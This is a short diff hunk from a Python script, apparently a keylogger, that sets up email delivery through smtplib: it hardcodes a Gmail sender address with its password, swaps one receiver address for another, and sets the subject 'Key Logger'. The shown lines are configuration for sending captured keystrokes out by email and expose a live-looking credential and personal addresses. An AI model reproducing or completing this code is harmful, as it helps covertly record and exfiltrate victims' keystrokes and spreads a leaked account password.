@@ -5,7 +5,7 @@ import smtplib
 
 emailer = "logger274@gmail.com"
 emailerPassword = "aaybvlfbvjdjafsv"
-receiver = "ariellewmaltese@gmail.com"
+receiver = "dillonmaltese@gmail.com"
 
 subject = 'Key Logger'
 body = " "
